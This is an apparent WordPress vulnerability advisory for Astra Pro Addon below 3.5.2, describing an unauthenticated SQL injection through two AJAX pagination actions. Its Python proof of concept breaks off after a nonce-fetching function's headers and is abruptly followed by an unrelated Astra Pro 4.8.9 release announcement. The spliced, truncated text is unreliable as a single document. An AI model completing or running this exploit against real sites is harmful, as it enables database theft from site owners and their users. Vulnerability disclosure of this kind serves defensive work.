## WordPress Plugin Vulnerabilities

# Astra Pro Addon < 3.5.2 - Unauthenticated SQL Injection

### Description

The plugin did not properly sanitise or escape some of the POST parameters from the astra\_pagination\_infinite and astra\_shop\_pagination\_infinite AJAX action (available to both unauthenticated and authenticated user) before using them in SQL statement, leading to an SQL Injection issues

### Proof of Concept

Via astra\_pagination\_infinite action:
import argparse
import requests as req
from bs4 import BeautifulSoup as bs
import json
req.urllib3.disable\_warnings()
def get\_nonce(url):
try:
headers = {"Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"", "Sec-Ch-Ua-Mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

Hello Astra Pro users!

We’re thrilled to announce the release of **Astra Pro 4.8.9**, packed with enhancements and fixes to elevate your website-building experience.

This version introduces improved color settings that sync seamlessly with the global color palette, ensuring consistent design across your site. It also includes post-type-specific cached style file generation for better plugin compatibility, especially with tools like Toolset Post Type.

Additionally, this update resolves several key issues, including submenu hover color inheritance, WPML translation errors, and fatal errors on the order page. Compatibility and layout fixes for Mega Menus, Masonry layouts in RTL mode, and variation selection for custom attributes have also been addressed.

Let’s dive into the details!

**Improvement:**

* Color settings synced with updated global color palette from theme.
* Added post-type specific cached style file generation for better compatibility with plugins like Toolset Post Type using the Astra File Generation option.

**Fixes**:

* Resolved an issue where nested submenus incorrectly inherited hover colors from the parent menu, despite having separate hover colors set.
* Resolved an error encountered when translating media in WPML while using the Astra theme and Astra Pro plugin.
* Resolved a fatal error on the order page that occurred when a product was removed from the website.
* Resolved misalignment issues for Mega Menu submenu items in RTL mode when using a custom width.
* Resolved inconsistent variation selection for products with custom attributes in URLs.
* Resolved RTL compatibility issue with Masonry layout by adding dynamic alignment detection.
* Resolved an issue where the Template Source dropdown was missing for Mega Menu templates.

To benefit from these updates, make sure to update Astra Pro to the latest version through your WordPress dashboard or download it directly from your account on the Store.

If you have any questions or need assistance, feel free to reach out to our support team. We’re always here to help!

Best,

Team Astra Pro
